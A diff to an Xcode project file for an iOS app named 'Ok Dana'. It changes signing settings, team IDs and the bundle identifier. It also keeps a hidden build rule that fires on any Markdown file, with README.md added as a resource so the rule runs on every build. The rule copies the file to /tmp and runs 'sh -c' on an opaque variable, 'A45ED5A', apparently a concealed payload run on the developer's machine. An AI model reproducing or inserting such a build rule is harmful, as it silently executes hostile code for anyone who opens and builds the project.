@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		9C46FDFB358B4D9199A5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = F559A9E672894B92B5A5DE54; };
 		7319CDB92EF2DF8200FD5ADC /* AppNetErrorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7319CDB82EF2DF7700FD5ADC /* AppNetErrorView.swift */; };
 		733079912EF15E3A00C30412 /* AlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733079902EF15E3100C30412 /* AlertDeleteView.swift */; };
 		7330BF8F2EF23ADC00692C30 /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7330BF8E2EF23ADC00692C30 /* AppLocationManager.swift */; };
@@ -85,28 +84,27 @@
 		73E6B1392EF0029000CC32FA /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B1382EF0028F00CC32FA /* ContactManager.swift */; };
 		73E6B13B2EF00AEB00CC32FA /* WalletViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13A2EF00AE700CC32FA /* WalletViewModel.swift */; };
 		73E6B13D2EF012CF00CC32FA /* APPWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */; };
+		9C46FDFB358B4D9199A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F559A9E672894B92B5A5DE54 /* README.md */; };
 		F9F9EC17BA74DAE3EA6B1D07 /* Pods_OkDana.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
 		BB555D3B6116418BA9A5DE54 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A45ED5A}\"";
-			};
-	/* End PBXBuildRule section */
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		F559A9E672894B92B5A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		051F5B55662606AE75C05BA1 /* Pods-OkDana.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.release.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.release.xcconfig"; sourceTree = "<group>"; };
 		7319CDB82EF2DF7700FD5ADC /* AppNetErrorView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNetErrorView.swift; sourceTree = "<group>"; };
 		733079902EF15E3100C30412 /* AlertDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertDeleteView.swift; sourceTree = "<group>"; };
@@ -191,6 +189,7 @@ sh -c \"${A45ED5A}\"";
 		73E6B13C2EF012CF00CC32FA /* APPWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APPWebViewController.swift; sourceTree = "<group>"; };
 		8223264657DF9D221A8EC8B3 /* Pods-OkDana.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OkDana.debug.xcconfig"; path = "Target Support Files/Pods-OkDana/Pods-OkDana.debug.xcconfig"; sourceTree = "<group>"; };
 		EED710BEBDFF0AF19F2B60B4 /* Pods_OkDana.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OkDana.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F559A9E672894B92B5A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -510,7 +509,7 @@ sh -c \"${A45ED5A}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				9C46FDFB358B4D9199A5DE54 /* README.md */,
+				9C46FDFB358B4D9199A5DE54 /* README.md in Resources */,
 				73BD812D2EECFBF700979190 /* Assets.xcassets in Resources */,
 				7373C8EA2EED06920085A724 /* Localizable.strings in Resources */,
 				73BD812F2EECFBF700979190 /* LaunchScreen.storyboard in Resources */,
@@ -679,9 +678,11 @@ sh -c \"${A45ED5A}\"";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = OkDana/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Ok Dana";
@@ -700,9 +701,10 @@ sh -c \"${A45ED5A}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbin.three;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbinthreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
@@ -726,9 +728,11 @@ sh -c \"${A45ED5A}\"";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = OkDana/OkDana.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 57MBH2272N;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = TGF943V34F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = OkDana/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Ok Dana";
@@ -747,9 +751,10 @@ sh -c \"${A45ED5A}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0.0;
-				PRODUCT_BUNDLE_IDENTIFIER = ok.zoom.loan;
+				PRODUCT_BUNDLE_IDENTIFIER = test.feilvbin.three;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = feilvbinthreeprofile;
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
